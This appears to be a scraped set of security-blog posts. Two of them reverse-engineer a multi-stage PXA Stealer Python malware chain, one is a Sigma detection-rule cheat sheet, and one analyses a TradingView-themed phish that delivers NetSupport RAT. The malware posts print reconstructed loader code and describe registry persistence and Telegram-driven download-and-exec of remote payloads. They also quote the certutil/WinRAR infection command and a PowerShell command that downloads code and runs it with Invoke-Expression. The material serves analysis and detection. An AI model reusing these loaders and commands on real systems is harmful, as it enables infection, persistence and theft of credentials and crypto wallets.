(rsa_encrypted_key) 46 LOAD_FAST 1 (rsa_private_key) 48 CALL_FUNCTION 2 50 STORE_FAST 6 (combined_key) 52 52 LOAD_FAST 6 (combined_key) 54 LOAD_CONST 0 (None) 56 LOAD_CONST 2 (16) 58 BUILD_SLICE 2 60 BINARY_SUBSCR 62 STORE_FAST 7 (rc4_key) 53 64 LOAD_FAST 6 (combined_key) 66 LOAD_CONST 2 (16) 68 LOAD_CONST 3 (32) 70 BUILD_SLICE 2 72 BINARY_SUBSCR 74 STORE_FAST 8 (xor_key) 54 76 LOAD_FAST 6 (combined_key) 78 LOAD_CONST 3 (32) 80 LOAD_CONST 4 (48) 82 BUILD_SLICE 2 84 BINARY_SUBSCR 86 STORE_FAST 9 (aes_key) 57 88 LOAD_GLOBAL 4 (aes_decrypt) 90 LOAD_FAST 5 (aes_encrypted) 92 LOAD_FAST 9 (aes_key) 94 CALL_FUNCTION 2 96 STORE_FAST 10 (xor_encrypted) 60 98 LOAD_GLOBAL 5 (xor) 100 LOAD_FAST 10 (xor_encrypted) 102 LOAD_FAST 8 (xor_key) 104 CALL_FUNCTION 2 106 STORE_FAST 11 (rc4_encrypted) 63 108 LOAD_GLOBAL 6 (rc4) 110 LOAD_FAST 11 (rc4_encrypted) 112 LOAD_FAST 7 (rc4_key) 114 CALL_FUNCTION 2 116 STORE_FAST 12 (decrypted_data) 65 118 LOAD_FAST 12 (decrypted_data) 120 RETURN_VALUE Looking closely at the disassembly output, we can see lots of slicing operations a indicating that multiple smaller keys have been combined into one large key, which is RSA-encrypted.\nTherefore we need to decrypt the key then slice it into segments, with each slice used for a different layer of decryption.\nAfter a lot of trial and error, running Python over and over again, we’ve reconstructed a working version of the original hybrid_decrypt function:\nfrom Crypto.Cipher import AES, PKCS1_OAEP, ARC4 from Crypto.PublicKey import RSA import base64 import zlib import dis import marshal privateKey = \u0026#39;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tL........\u0026#39; cipherText = (\u0026#39;c$@+K1OoexoWdBsm1!pkF\u0026gt;7T}ijW92LAjwj?NX;j........\u0026#39;) def rc4(data, key): cipher = ARC4.new(key) return cipher.decrypt(data) def xor(data, key): return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)]) def aes_decrypt(data, key): nonce = data[:16] cipherText2 = data[16:] cipher = AES.new(key, AES.MODE_EAX, nonce=nonce) return cipher.decrypt(cipherText2) def rsa_decrypt(data, key): rsa_key = RSA.import_key(key) cipher = PKCS1_OAEP.new(rsa_key) return cipher.decrypt(data) def hybrid_decrypt(base85_encoded_data, rsa_private_key): compressed_data = base64.b85decode(base85_encoded_data) encrypted_data = zlib.decompress(compressed_data) rsa_encrypted_key = encrypted_data[:256] aes_encrypted = encrypted_data[256:] combined_key = rsa_decrypt(rsa_encrypted_key, rsa_private_key) rc4_key = combined_key[:16] xor_key = combined_key[16:32] aes_key = combined_key[32:48] xor_encrypted = aes_decrypt(aes_encrypted, aes_key) rc4_encrypted = xor(xor_encrypted, xor_key) decrypted_data = rc4(rc4_encrypted, rc4_key) return decrypted_data # Main private_key_pem = base64.b64decode(privateKey).decode() decrypted_payload = hybrid_decrypt(cipherText, private_key_pem) dis.dis(marshal.loads(decrypted_payload)) Note:\nThe individual decryption functions (like rsa_decrypt, aes_decrypt, etc.) were reconstructed from other parts of the disassembly, which aren\u0026rsquo;t shown above. Just focus on understanding and mapping out the hybrid_decrypt function itself.\nI could easily write another blog posts just on how that reconstruction was done but for now, the key takeaway is this:\nIf you compare the strings and values in the disassembled code with the ones used in the reconstructed Python function, you\u0026rsquo;ll notice they match up directly. This is how we were able to rebuild the logic behind hybrid_decrypt.\nAnalysing Stage 4 # Running the fully reconstructed hybrid_decrypt function outputs a large block of disassembled bytecode this marks the beginning of Stage 5.\nFollowing the same approach as earlier, I\u0026rsquo;m going to list out the functions that stand out.\n4 IMPORT_NAME 0 (requests) ..... 20 IMPORT_NAME 2 (time) ..... 28 IMPORT_NAME 3 (sys) .... 36 IMPORT_NAME 4 (os) ..... 44 IMPORT_NAME 5 (winreg) ..... 60 LOAD_NAME 4 (os) 62 LOAD_ATTR 7 (path) 64 LOAD_METHOD 8 (exists) 66 LOAD_NAME 4 (os) 68 LOAD_ATTR 9 (environ) 70 LOAD_CONST 3 (\u0026#39;PUBLIC\u0026#39;) ..... 88 LOAD_ATTR 9 (environ) 90 LOAD_CONST 5 (\u0026#39;COMPUTERNAME\u0026#39;) ...... 110 LOAD_NAME 5 (winreg) 112 LOAD_ATTR 14 (HKEY_CURRENT_USER) 114 LOAD_CONST 6 (\u0026#39;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\u0026#39;) ...... 128 LOAD_METHOD 17 (SetValueEx) 130 LOAD_NAME 16 (key) 132 LOAD_CONST 7 (\u0026#39;Windows Update Service\u0026#39;) ..... 140 LOAD_CONST 8 (\u0026#39;cmd /c start \u0026#39;) ...... 154 LOAD_CONST 10 (\u0026#39;\\\\Windows\\\\svchost.exe C:\\\\Users\\\\Public\\\\Windows\\\\Lib\\\\images.png \u0026#39;) ...... 182 LOAD_NAME 1 (re) 184 LOAD_METHOD 22 (search) 186 LOAD_CONST 12 (\u0026#39;\u0026lt;meta property=\u0026#34;og:description\u0026#34; content=\u0026#34;([^\u0026#34;]+)\u0026#34;\u0026#39;) 188 LOAD_NAME 0 (requests) 190 LOAD_METHOD 23 (get) 192 LOAD_CONST 13 (\u0026#39;https://t.me/\u0026#39;) 194 LOAD_NAME 3 (sys) 196 LOAD_ATTR 20 (argv) ...... 222 LOAD_METHOD 23 (get) 224 LOAD_NAME 0 (requests) 226 LOAD_ATTR 27 (head) 228 LOAD_CONST 14 (\u0026#39;https://is.gd/\u0026#39;) 230 LOAD_NAME 25 (match) 232 LOAD_METHOD 28 (group 234 LOAD_CONST 11 (1) ...... 19 290 LOAD_NAME 2 (time) 292 LOAD_METHOD 33 (sleep) 294 LOAD_CONST 16 (5) Converted to source code, it would have looked something like this.\nHopefully, this version is a bit more understandable for the rest of the discussion:\nimport requests import re import time import sys import os import winreg import uuid try: # Check if a specific file path exists in PUBLIC folder public_path = os.environ[\u0026#39;PUBLIC\u0026#39;] computer_name = os.environ[\u0026#39;COMPUTERNAME\u0026#39;] unique_path = os.path.join( public_path, str(uuid.uuid5(uuid.NAMESPACE_DNS, computer_name)).replace(\u0026#39;-\u0026#39;, \u0026#39;\u0026#39;) ) if not os.path.exists(unique_path): # Persistence via registry key = winreg.OpenKey( winreg.HKEY_CURRENT_USER, r\u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;, 0, winreg.KEY_SET_VALUE ) command = ( \u0026#39;cmd /c start \u0026#39; + os.path.expandvars(\u0026#39;%PUBLIC%\u0026#39;) + r\u0026#39;\\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png \u0026#39; + sys.argv[1] ) winreg.SetValueEx( key, \u0026#39;Windows Update Service\u0026#39;, 0, winreg.REG_SZ, command ) winreg.CloseKey(key) # Get the Telegram page response = requests.get(\u0026#39;https://t.me/\u0026#39; + sys.argv[1]) match = re.search(r\u0026#39;\u0026lt;meta property=\u0026#34;og:description\u0026#34; content=\u0026#34;([^\u0026#34;]+)\u0026#34;\u0026#39;, response.text) if match: # Follow the is.gd redirect short_id = match.group(1) final_url = requests.head(\u0026#39;https://is.gd/\u0026#39; + short_id, allow_redirects=True).url payload = requests.get(final_url).text # Execute downloaded code exec(payload) except Exception as e: print(e) time.sleep(5) # Retry logic (loops back in bytecode) It first checks for the existence of a very specific folder in C:\\Users\\Public.\nThis is most likely used as an infection checker possibly to act as a kill switch if later stages have been executed.\nAs we continue reviewing the code, we find confirmation:\nIt sets a registry Run key named Windows Update Service with the following command:\ncmd /c \\\\Windows\\\\svchost.exe C:\\\\Users\\\\Public\\\\Windows\\\\Lib\\\\images.png \u0026lt;sys.argv[1]\u0026gt;\nIf you remember from Stage 2, this points to the Python executable and the initial script, effectively re-launching the malware on reboot.\nFurther down, we find a regex search applied to the results of a GET request made to a Telegram server.\nI\u0026rsquo;m going to pull out and isolate this section next for a more detailed analysis.\n182 LOAD_NAME 1 (re) 184 LOAD_METHOD 22 (search) 186 LOAD_CONST 12 (\u0026#39;\u0026lt;meta property=\u0026#34;og:description\u0026#34; content=\u0026#34;([^\u0026#34;]+)\u0026#34;\u0026#39;) 188 LOAD_NAME 0 (requests) 190 LOAD_METHOD 23 (get) 192 LOAD_CONST 13 (\u0026#39;https://t.me/\u0026#39;) 194 LOAD_NAME 3 (sys) 196 LOAD_ATTR 20 (argv) The regex search is targeting a very specific HTML pattern, which looks like this: \u0026lt;meta property=\u0026quot;og:description\u0026quot; content=\u0026quot;\u0026hellip;some text here\u0026hellip;\u0026quot;\u0026gt;\nThe full URI took some work to uncover. It’s derived by accessing an attribute passed via sys.argv.\nAfter some frustration, I recalled the string we saw all the way back in Stage 2: ADN_UZJomrp3vPMujoH4bot\nThis was passed into stage 2 as an argument and it turns out this string is the missing part of the Telegram URL, which forms: https://t[.]me/ADN_UZJomrp3vPMujoH4bot\nSending a curl request to that Telegram URL reveals a large HTML file but the key part is: \u0026lt;meta property=\u0026quot;og:description\u0026quot; content=\u0026quot;s5xknuj2\u0026quot;\u0026gt; The regex matches on that content value in this case, s5xknuj2.\nThat matched value becomes the key input in a second GET request to is.gd, which is used as a URL shortener to retrieve more code for execution.\nThe logic in disassembled form looks like this:\n218 LOAD_NAME 26 (exec) 222 LOAD_METHOD 23 (get) 224 LOAD_NAME 0 (requests) 226 LOAD_ATTR 27 (head) 228 LOAD_CONST 14 (\u0026#39;https://is.gd/\u0026#39;) 230 LOAD_NAME 25 (match) 232 LOAD_METHOD 28 (group) This short, obfuscated redirection flow makes the malware harder to trace and gives the attacker flexibility to update payloads dynamically all without modifying the original lure. They simply update the description on their Telegram bot.\nIf we curl https://is[.]gd/s5xknuj2 it redirects us to https://paste[.]rs/fVmzS\n… it starts the entire process over again delivering a new payload with the same overall structure as Stage 2, but with a different Base85 string: exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(\u0026quot;c$|c~*|PFlk|y|1XNVIgA|vOF$g0Ys7\u0026gt;c3......\u0026quot;))))\nWelcome to Stage 5. But before we dive in, let’s take a quick breather and recap what we’ve covered so far.\u0026quot;\nQuick Recap: What Have We Found?\nWhat began as a simple phishing lure evolved into a multi-stage Python malware chain featuring:\nDLL side-loading Execution of Python bytecode via Base85-encoded payloads Multiple layers of encryption and obfuscation Persistence via Windows Registry A clever use of Telegram bot metadata to fetch commands And finally, redirection through URL shorteners to dynamically update payloads Each layer was designed to evade detection, frustrate analysis, and allow the attacker to push new stages without modifying the earlier ones.\nUp Next: Stage 5 – Analysing the Payload # In Part 3, we shift our attention to the fifth and final Python stage, a fully fledged information stealer. We’ll uncover:\nCredential harvesting from Chrome and Firefox Extraction of cookies, credit cards, 2FA tokens, and more AV enumeration using Windows Management Instrumentation (WMI) Clever exfiltration via Telegram bots Indicators suggesting links to the PXA Stealer family This is where the campaign reveals its true intent not just execution, but exploitation. Get ready for the deep dive into the weaponised payload.\n","date":"30 August 2025","externalUrl":null,"permalink":"/posts/python_malware_part2/","section":"Blog","summary":"Learn to disassemble Python bytecode and reconstruct custom hybrid encryption loaders as PXA Stealer uses multi-layered in-memory execution, registry persistence, and Telegram C2 to evade detection.","title":"PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 \u0026 4)","type":"posts"},{"content":" Introduction # Join me as we peel back layer upon layer of Python code, shellcode, and executables, each more difficult then the last all in the effort of uncovering a novel attack campaign. An operation that appears to have been orchestrated by a single threat actor who successfully evaded detection and operated entirely under the radar.\nStrap in: this is the first instalment of a six-part series, with each part diving into a different stage of the malware.\nThis section introduces the foundational knowledge necessary for understanding Python malware reverse engineering. It explores the early-stage payload structure and simple obfuscation techniques used in the initial stages of execution.\nNote: Since writing this, SentinelOne has published an excellent report covering Stages 1–5. It’s well worth a read for additional context, though the material from Stages 6–9 remains unique to this write-up, so stick around for that.\nPhishing Attack Analysis – Copyright Report Lure # This attack begins with a phishing email that emphasises the importance of reading an attached document related to copyright infringement. However, the attachment is not a document at all it\u0026rsquo;s a ZIP archive masquerading as one.\nVirusTotal reference: https://www.virustotal.com/gui/file/a3963c1f05b6c13e6e5973b1f4d0152d01e946ffaf79d9b5908d0d1f1eb5a6d1\nOnce unzipped, the folder reveals the following contents:\nFilename Detailed_report_document_on_actions_involving_copyrighted_material.exe vcruntime140.dll version.dll _\\Document.pdf (Hidden Folder) _\\Images.png (Hidden Folder) The Lure: A Fake PDF # The primary lure in this attack is the file: Detailed_report_document_on_actions_involving_copyrighted_material.exe\nThis executable is disguised with a PDF icon and given a deliberately long filename to hide its .exe extension in file explorers, aiming to trick users into thinking it\u0026rsquo;s a legitimate document. However, the .exe extension betrays its true nature.\nRunning a quick hash search on VirusTotal shows that this file is, interestingly, a known (semi-legitimate) PDF reader:\nhpreader.exe on VirusTotal\nThe executable appears to be signed and hasn’t been directly modified. This leads us to the next logical point of investigation: DLL side-loading.\nWhat’s a DLL? # A DLL (Dynamic Link Library) is a file that contains code and data that programs can use. Think of it as a toolbox: rather than each program carrying its own tools, they share common ones (DLLs) to save space and make updates easier.\nFor example, a program might ask Windows to load vcruntime140.dll to make use of standard C runtime functions, such as memory allocation, string manipulation, or exception handling.\nNow, What’s “Sideloading”? # Sideloading is when a program loads a DLL from the same folder it\u0026rsquo;s in, rather than from the official location (like the Windows system folder).\nAttackers abuse this by:\nFinding a legitimate program that looks for a specific DLL. Placing a malicious version of that DLL next to the program. When the program runs, it loads the attacker’s fake DLL instead of the real one. Because the program itself is trusted (and maybe even signed by a known company), security tools might not raise alarms as they think everything is normal.\nInvestigating the DLLs # When inspecting the dropped DLLs: vcruntime140.dll still has a valid Microsoft signature, so it\u0026rsquo;s likely a legitimate dependency or decoy. That means we can focus our attention on the more suspicious file: version.dll. Digging Deeper into the Hidden Files # So we have found the malicious binary version.dll, but there are two other files hidden away in a concealed folder:\nDocument.pdf Images.png Let’s take a closer look at them.\nImages.png – A Familiar Signature # Opening Images.png, we quickly realise it’s not actually an image.\nViewing it with a hex editor, we see the file begins with the familiar magic bytes:\n4D 5A\nThat’s MZ in ASCII the signature of a Windows executable file.\nRunning the hash through VirusTotal and inspecting the signature confirms it:\nThis isn’t an image, it’s a legitimate WinRAR executable.\nSo why is WinRAR bundled in a phishing ZIP?\nThis suggests the attacker is using a Bring Your Own Binary (BYOB) technique in this case, bundling WinRAR to ensure consistent execution of their payload, regardless of what’s installed on the victim’s system.\nWe\u0026rsquo;ll want to keep an eye out for zipped or self-extracting archives.\nDocument.pdf – Suspiciously Large “Key” # Next, we inspect Document.pdf. At first, it appears to be plain text but the contents look strange: It starts with a **header resembling an base64 encoded certificate: -----BEGIN CERTIFICATE----- But the file is 23.4 MB, which is far too large for a certificate. The contents appear to be Base64-encoded which is common for keys/certificates but could also be concealing something. So let’s test a theory: we strip off the header and decode the base64 blob in CyberChef.\nAnd there it is, decoding the base64 reveals a file beginning with:\n50 4B\nThat’s the \u0026ldquo;PK\u0026rdquo; signature for a ZIP archive (also common to .zip, .docx, .jar, etc).\nThe Payload is Found # We’ve now uncovered what appears to be the Stage 2 payload, hidden inside Document.pdf under the guise of a bogus certificate.\nSaving the decoded output as a .zip file and opening it reveals the second stage, now ready to be analysed.\nAnd just like that\u0026hellip;\nStage 2 begins. # Sandbox Execution \u0026amp; Process Observation # Before proceeding further, let\u0026rsquo;s validate our hypothesis by executing the original payload in a sandboxed environment.\nUtilising Sysmon (and powerSIEM), we captured the following process creation event:\nType: Process Create Image: C:\\Windows\\SysWOW64\\cmd.exe ParentImage: C:\\Users\\Malware\\Desktop\\sample\\Detailed_report_document_on_actions_involving_copyrighted_material.exe CommandLine: cmd /c cd _ \u0026amp;\u0026amp; start Document.pdf \u0026amp;\u0026amp; certutil -decode Document.pdf Invoice.pdf \u0026amp;\u0026amp; images.png x -ibck -y Invoice.pdf C:\\Users\\Public \u0026amp;\u0026amp; start C:\\Users\\Public\\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png ADN_UZJomrp3vPMujoH4bot Step-by-Step Breakdown of the Command # Let\u0026rsquo;s unpack this command step-by-step:\nstart Document.pdf\nOpens the file Document.pdf with the default PDF viewer. This action distracts the user; however, since this is actually an encoded zip file, the PDF viewer displays an error. certutil -decode Document.pdf Invoice.pdf\nDecodes the encoded Document.pdf into Invoice.pdf. certutil is a windows binary making this a cleaver use of a LOLBIN to decode it\u0026rsquo;s payload. images.png x -ibck -y Invoice.pdf C:\\Users\\Public\\Windows\nRemember images.png is WinRar, this extracts the contents of the decoded Invoice.pdf (a disguised archive). Files are placed into C:\\Users\\Public\\Windows. start C:\\Users\\Public\\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png ADN_UZJomrp3vPMujoH4bot\nExecutes the extracted payload svchost.exe from C:\\Users\\Public\\Windows. Onto Stage 2 # Upon examining the command captured by Sysmon, we notice two files that are new to this stage:\nstart C:\\Users\\Public\\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png ADN_UZJomrp3vPMujoH4bot From this, we can assume:\nsvchost.exe and images.png are part of the Stage 2 payload A variable or argument (ADN_UZJomrp3vPMujoH4bot) is passed in, possibly a key or ID? svchost.exe – A Familiar Name, but Suspicious Behaviour # Despite the name, this isn’t the real Windows svchost.exe. Checking the signature reveals it\u0026rsquo;s signed by:\nPython Software Foundation\nThat’s a strong clue and VirusTotal confirms it’s the legitimate pythonw.exe, a version of Python that runs silently (no console window), often used for running background scripts.\nimages.png – Obfuscated Python Script # Opening images.png in a hex editor reveals it’s actually Python code albeit heavily obfuscated.\nTo make things easier, we rename it to stage2.py so we can explore it with syntax highlighting in VSCode.\nObfuscation \u0026amp; Dynamic Execution # Skimming the file, we find a large number of dummy variables and unused functions, a very basic form of obfuscation.\nBut buried in the middle, we see the key payload trigger:\nexec(__import__(\u0026#39;marshal\u0026#39;).loads(__import__(\u0026#39;zlib\u0026#39;).decompress(__import__(\u0026#39;base64\u0026#39;).b85decode(\u0026#34;c$|ee*\u0026gt;\u0026gt;VcmVoh+\u0026amp;b9W+s_L$Gd..............\u0026#34;) Breaking this down:\nexec() is used to dynamically run code at runtime marshal is used to load precompiled Python bytecode zlib is decompressing it And interestingly, it uses Base85 encoding, a less common alternative to Base64 What’s Python Bytecode? # You might not be familiar with Python bytecode after all, Python is typically known as an interpreted language. Bytecode files aren’t particularly common in malware analysis, so here’s a quick primer:\n.py files are Python source code,human-readable and editable. .pyc files are compiled bytecode, automatically generated when a .py script is run. Bytecode is faster for the Python interpreter to execute, but it’s not human-readable. To reverse it back into source code, we’ll need tools like uncompyle6, or use dis to view a disassembled version of the bytecode. Understanding the difference between source code and bytecode is crucial for progressing with the analysis in Stage 3.\nConclusion # Through the analysis of Stage 1 and 2, we’ve uncovered the attacker’s initial strategy: leveraging trusted binaries, sideloaded DLLs, and cleverly disguised payloads to establish execution without raising suspicion. From the fake PDF lure to the use of certutil, WinRAR, and embedded Python scripts, it’s clear this campaign was designed to operate quietly and effectively under the radar.\nBy the end of this stage, we\u0026rsquo;ve identified how the payloads are obfuscated, staged, and executed using legitimate tools in unintended ways. Most importantly, we’ve decoded the structure and intent behind the initial infection vector, providing a strong foundation for deeper memory-focused analysis.\nUp Next: Stage 3 – Dissecting In-Memory Python Bytecode # In Part 2, we’ll step into the world of in-memory execution. We’ll decode the Base85-encoded bytecode, reverse engineered the custom cryptographic loader, and uncover how the attacker dynamically executes Python payloads without ever touching disk.\nWe’ll also look at:\nDisassembling Python bytecode with dis Rebuilding encryption logic from marshalled code Extracting runtime payloads from obfuscated blobs Reversing Multiple layers of encryption and obfuscation Get ready for a deep dive into the mechanics of bytecode analysis and memory-only payload execution.\n","date":"29 August 2025","externalUrl":null,"permalink":"/posts/python_malware_part1/","section":"Blog","summary":"Uncover how a copyright phishing email delivers multi-stage Python malware through DLL sideloading, hidden archives, and Base64 obfuscation in this deep-dive intro to Python malware reverse engineering.","title":"PXA Stealers Evolution to PureRAT: Part 1 - Basics of Python Reversing \u0026 Static Analysis (Stage 1 \u0026 2)","type":"posts"},{"content":"A concise guide for writing, editing, and testing Sigma detection rules. Covers rule structure, value modifiers, best practices, common pitfalls, and tools. Perfect for SOC analysts, threat hunters, and detection engineers working with SIEMs like Splunk, Elastic, or LogPoint.\nRule Anatomy # Metadata # Field Description title Rule name / alert title id UUID (generate at https://www.uuidgenerator.net) status stable, test, or experimental description Brief summary of what the rule detects author Author’s name(s) date Date of creation tags Use lowercase, Mitre ATT\u0026amp;CK tags (e.g., execution, persistence) logsource product, service, and category (e.g., windows -\u0026gt; sysmon -\u0026gt; process_creation) references External docs or URLs level informational, low, medium, high, or critical falsepositives Describe possible benign triggers Detection # The core of a rule – where logic is applied.\nStructure # detection: selection: FieldName: value filter: FieldName: benign_value condition: selection and not filter Data Types # Type Syntax Meaning List (OR) FieldName:\n- value1\n- value2 Matches any listed value Map (AND) FieldName1: value1\nFieldName2: value2 Matches all values together Value Modifiers # Attach with | to the field name to change behaviour:\nModifier Function contains Match value anywhere in string startswith Match value at start endswith Match value at end all Match all values in list (instead of default OR) re Use regex base64 / base64offset For encoded strings utf16le / utf16be / wide Encoded text matching windash Match both - and / cmdline switches cidr Match IP ranges (e.g., `source_ip Condition Logic # Tie search identifiers together with logical operators:\nSyntax Meaning and, or Logical operations not Negate condition 1 of, all of Match one/all of multiple identifiers () Group logic for precedence near Search items near each other in logs (e.g. near selection1 and not filter) Examples # Match RDP activity but exclude known good: # detection: rdp_outbound: DestinationPort: 3389 Initiated: true filter: Image: \u0026#34;known-good.exe\u0026#34; condition: rdp_outbound and not filter Match command lines containing suspicious tools: # detection: selection: CommandLine|contains: - \u0026#34;mimikatz\u0026#34; - \u0026#34;procdump\u0026#34; condition: selection Use regex to match encoded hostnames: # detection: selection: Hostname|re: \u0026#39;^[A-Za-z0-9]{16}$\u0026#39; condition: selection Best Practices # Keep rule logic clear and modular Use descriptive names for search identifiers (selection_admin, filter_legit_admin) Test rules with sample logs before deploying Use specific field values (avoid overuse of wildcards or *) Avoid matching on CommandLine alone Use contains|all to match multiple args regardless of order Where possible match on behaviour, not just indicators. Use filter sections to reduce noise and false positives Common Pitfalls # Title: Avoid explanations keep it short and alert-friendly Backslashes: Use plain where possible (C:\\Path\\File.exe), escape only when needed \\\\ = single \\, \\\\\\\\ = \\\\, \\* = wildcard, \\\\* = \\ + wildcard Tags: Don’t use MITRE links—use tags instead Use proper formats: attack.execution, attack.t1003.002, cve.2021-34527 False Positives: Don’t skip this section it helps analysts Be specific: e.g. “Backup software may trigger this” Creation Work-Flow # 1. Get the Repository\nClone: https://github.com/SigmaHQ/sigma Rules: ./rules Compiler: ./tools/sigmac 2. Edit Existing Rule or Templates\nUse VSCode for YAML editing Optional VSCode extensions: YAML support, linter Use existing rule as a template Modify these fields: title, description, status (set to experimental) reference, author, level (low/medium/high/critical) date in %Y/%m%d format logsource accuracy is important Adjust detection logic to match your use case 4. Test the Rule\nFind a good dataset with know bad and known good. Splunk has some great datasets Use sigmac or pysigma (requires Python 3) to compile into different languages include: es-qs, kibana, xpack-watcher logpoint, splunk, grep, fieldlist Helpful links: # Name Description SIGMA-Resources Curated list of Sigma rule examples, templates, and threat hunting tools Sigma Rule Creation Guide Official guide to writing Sigma rules with standards and best practices pySigma Modern Python framework for compiling, manipulating, and converting Sigma rules Sigconverter Online tool for converting Sigma rules into SIEM-specific queries ","date":"2 July 2025","externalUrl":null,"permalink":"/posts/sigma_rule_cheatsheet/","section":"Blog","summary":"Concise guide for writing Sigma detection rules covering structure, modifiers, best practices, and tools for SOC analysts and detection engineers working with Splunk, Elastic, or LogPoint.","title":"Sigma Rule Cheat Sheet","type":"posts"},{"content":" TradingView Themed Phish Spreads NetSupport RAT # A tried-and-tested crypto-themed cyber attack has popped up on my radar again today, a social engineering campaign masquerading as a legitimate TradingView AI indicator.\nThis isn’t new. In fact, 0x0vid did a great write-up on a similar campaign not too long ago: Another Day, Another Crypto Scam\nBut this new variant takes things up a notch. The YouTube account pushing this malware was so polished, it initially fooled me, and a few SOC mates into thinking the official TradingView YouTube channel had been compromised.\nThe Hook: Fake YouTube Video Promoting AI Crypto Predictions # The campaign hinges on a convincing YouTube video titled:\n“The First AI That Predicts Crypto Moves”\nThe video which was pushed out by Google\u0026rsquo;s own advertising, claims to showcase a new feature developed in collaboration with TradingView and OpenAI. It walks the viewer through how to activate this “AI indicator” using a command in the terminal after installing the TradingView desktop app.\nVideo walks you through the steps in the description:\nStep-by-Step Guide: 1. Install TradingView\u0026#39;s desktop app on your computer: 🔗 https://www.tradingview.com/desktop/ 2. Since the AI indicator is still in Beta, you need to enable beta mode in TradingView using Command Prompt. To open Command Prompt, press Win + R, type \u0026#34;cmd\u0026#34;, and press Enter. 3. Copy the beta mode update command from our repository (link below), then paste it into the command prompt window, and press Enter: 🔗 https://copycode[.]io/w3ux1X1V/ 4. After the update is successful, you will receive a notification. So far, this all looks legitimate. But the rabbit hole begins at:\ncopycode[.]io – a very polished but hollow site that hosts only a PowerShell command. The hosted command is deceptively simple:\npowershell -command \u0026#34;$tradingview=\u0026#39;[.]app\u0026#39;;$version=\u0026#39;3.9.1_AI_Beta\u0026#39;;$update=\u0026#39;betamode\u0026#39;+$tradingview;$app=(Invoke-WebRequest $update -UseBasicParsing).Content;([Text.Encoding]::UTF8.GetString($app))|Invoke-Expression\u0026#34; With a little bit of reverse engineering we can see it:\nPulls content from https://betamode[.]app Pipes it straight into Invoke-Expression — meaning code execution By defanging the command (removing Invoke-Expression), we can inspect the next stage. The script itself isn’t complex or heavily obfuscated. Here\u0026rsquo;s a breakdown of its actions:\n1. Infection Check # if (Test-Path \u0026#34;$env:APPDATA\\Nt\\client32.ini\u0026#34;) { Write-Host \u0026#34;Beta access temporarily paused due to high demand. Try again in 72 hours.\u0026#34; -ForegroundColor Red exit } A basic infection marker. If the system is already compromised, it exits and prints flavour text, presumably to avoid duplicate infections or raise suspicion with multiple popups.\n2. Creates a Folder C:\\Users\\{User}\\AppData\\Roaming\\Nt: # $ntFolderPath = Join-Path $env:APPDATA \u0026#34;Nt\u0026#34; New-Item -Path $ntFolderPath -ItemType Directory -Force Standard folder creation, nothing sophisticated here. Typically pretty well hidden from the user, making it a common place for malware will drop its binaries.\n3. Downloads Multiple Executables: # $filesToDownload = @(\u0026#34;client32.exe\u0026#34;, \u0026#34;NSM.LIC\u0026#34;, \u0026#34;remcmdstub.exe\u0026#34;, ...) Invoke-WebRequest -Uri \u0026#34;https://betamode.app/$file\u0026#34; ... This is the payload, specifically the NetSupport Manager client, a legitimate remote access tool repurposed here as a Remote Access Trojan (RAT). Again, no stealth, no encryption just plain Invoke-WebRequest.\n4. Sets Up Persistence with the name NuClient: # Set-ItemProperty -Path \u0026#34;HKCU:\\...Run\u0026#34; -Name \u0026#34;NuClient\u0026#34; -Value $exePath Persistence is added via a Run key, basic but effective. The name “NuClient” doesn’t stand out much, but it’s still detectable to anyone checking startup items.\n5. Scans for Ledger Live Installation: # $ledgerPath = Join-Path $env:APPDATA \u0026#34;Ledger Live\u0026#34; $ledgerExists = Test-Path $ledgerPath This is the clearest sign of targeting. Ledger Live is a popular crypto wallet application, and the malware explicitly checks for it suggesting the actor is looking for stored seed phrases or private keys.\n6. Phone Home (Well the TA Home) # if ($ledgerExists) { $postData = \u0026#34;$computerName + Ledger Live\u0026#34; } else { $postData = $computerName } The malware checks the environment, builds a profile of the machine (including whether a wallet is present), and prepares it for exploitation.\nThe data is then encrypted using AES with a hardcoded key: w7E9wVX3GE5fPymZn4+1Y4QoyaqzZ6zJtqCHXn0RAzM=\nThen sending this data tohttps://betamode[.]app/info2.php in a post request.\nThis is effectively a “phone home” signal, flagging the machine for manual RAT access depending on its crypto relevance.\n7. Closes with Deceptive Messaging # Write-Host \u0026#34;Beta access temporarily paused due to high demand. Try again in 72 hours.\u0026#34; -ForegroundColor Red Classic misdirection. This message closes the loop on the fake “AI beta feature” narrative while distracting the user from noticing anything suspicious has occurred.\nWhy This Simple Campaign Almost Worked # Despite the fact that the actual malware was unsophisticated, the delivery mechanism was exceptionally well-executed. What made this campaign effective wasn\u0026rsquo;t technical complexity it was visual polish, clever use of branding, and a level of attention to detail that most scams skip.\nThis post isn’t just to dissect another PowerShell RAT delivery, it\u0026rsquo;s to underscore how social engineering has matured, and why we can\u0026rsquo;t just rely on basic checks anymore.\nHere’s why this nearly fooled even seasoned analysts:\nThe YouTube Video Was Shockingly Professional # At first glance, the video looked like a legitimate TradingView product launch:\nA well-dressed presenter delivered the walkthrough in a calm, confident tone. The pacing, editing, and subtitle formatting closely mimicked the real TradingView style. Branding elements like colour schemes, layout, and even the call-to-action mirrored TradingView’s media. I suspect the video was at least partially AI-generated. But it was so polished, it didn’t feel like it. It came across as a professional actor walking users through a legitimate beta rollout not a scam.\nHere’s a comparison between the legitimate TradingView YouTube page and the phishing channel that delivered the malware:\nHard to tell, right?\nEven with a trained eye, it’s easy to see how someone could be tricked. Especially when you realise that all the videos on both pages are legitimate!!!!\nThe phishing channel cleverly embedded or mirrored real TradingView videos to appear authentic. From what I can tell, the only video actually uploaded by the attacker is the one pushing the fake AI indicator. The rest just redirect or frame content from the real channel making it appear like part of the official video library.\nThe Domains Looked Legitimate and Thought-Out # Two domains played key roles:\ncopycode[.]io — The site hosting the PowerShell command betamode[.]app — The C2 for the RAT and malware staging These weren’t sketchy domains ending in .xyz, .top, or .cn. They were:\nWell-chosen — sounding like modern SaaS tooling or developer portals Visually convincing — especially copycode[.]io, which had custom logos, icons, code syntax 